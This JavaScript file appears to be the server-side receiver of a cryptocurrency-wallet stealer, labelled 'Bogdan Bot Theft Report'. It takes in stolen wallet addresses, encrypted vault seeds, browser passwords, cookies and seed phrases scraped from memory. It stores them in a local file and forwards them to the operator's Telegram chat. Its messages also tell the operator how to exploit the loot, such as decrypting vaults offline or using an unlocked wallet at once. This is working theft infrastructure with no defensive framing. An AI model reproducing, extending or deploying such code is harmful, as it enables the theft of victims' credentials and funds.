import crypto from 'crypto';
import fs from 'fs';
import path from 'path';

export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  const data = req.body;
  
  // Log to Vercel Console
  console.log('🔥 NEW STEAL PAYLOAD RECEIVED:', JSON.stringify(data, null, 2));

  // Send formatted report to Telegram via Bot API
  const telegramMessage = formatTelegramMessage(data);
  await sendToTelegram(telegramMessage);

  // Save to local file for immediate access
  try {
    const filePath = path.join(process.cwd(), 'data.json');
    const existingData = fs.existsSync(filePath) ? JSON.parse(fs.readFileSync(filePath, 'utf8')) : [];
    existingData.push({ ...data, id: Math.random().toString(36).substr(2, 9), timestamp: new Date().toISOString() });
    fs.writeFileSync(filePath, JSON.stringify(existingData, null, 2));
  } catch (e) {
    console.error("❌ File write failed:", e);
  }

  return res.status(200).json({ status: 'success', message: 'Payload recorded.' });
}

function formatTelegramMessage(data) {
  let msg = "*🔥 Bogdan Bot Theft Report*\n\n";
  
  // Handle Connection Notification
  if (data.source === "CONNECT") {
    msg += `*🔗 Wallet Connected*\n`;
    msg += `Address: \`${data.address}\`\n`;
    msg += `Provider: ${data.provider}\n`;
    msg += `Chain ID: ${data.chain_id}\n`;
    msg += `\n*Status:* Awaiting Scans...`;
    return msg;
  }

  if (data.source === "VAULT") {
    if (data.seeds && data.seeds.length > 0) {
      msg += `*🔑 Encrypted Vaults:* ${data.seeds.length}\n`;
      data.seeds.forEach(s => msg += `\`${s.substring(0, 50)}...\`\n`);
    }
    if (data.passwords && data.passwords.length > 0) {
      msg += `\n*💾 Passwords:* ${data.passwords.length}\n`;
      data.passwords.slice(0, 3).forEach(p => {
        msg += `\`URL: ${p.url} | User: ${p.username} | Pass: ${p.password}\`\n`;
      });
    }
    if (data.cookies && data.cookies.length > 0) {
      msg += `\n*🍪 Cookies:* ${data.cookies.length}\n`;
      data.cookies.slice(0, 3).forEach(c => {
        msg += `\`Host: ${c.host} | Name: ${c.name} | Value: ${c.value.substring(0, 20)}...\`\n`;
      });
    }
    msg += "\n*Action:* Decrypt vault offline using captured password.";
  } else if (data.source === "RAM") {
    if (data.ram_seed) {
      msg += `*🧠 Decrypted Seed from RAM:*\n\`${data.ram_seed}\`\n`;
      msg += "\n*Status:* Wallet is currently UNLOCKED. Immediate access possible.";
    } else {
      msg += "*🧠 RAM Scan Complete:* No active seed found.";
    }
  }
  return msg;
}

async function sendToTelegram(text) {
  const token = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;
  
  if (!token || !chatId) {
    console.warn("⚠️ Missing Telegram Env Vars");
    return;
  }
  
  try {
    const response = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ 
        chat_id: chatId, 
        text, 
        parse_mode: 'Markdown' 
      })
    });
    
    if (!response.ok) {
      const errorText = await response.text();
      console.error(`❌ Telegram API Error: ${response.status} - ${errorText}`);
    }
  } catch (e) {
    console.error("❌ Telegram send failed:", e);
  }
}
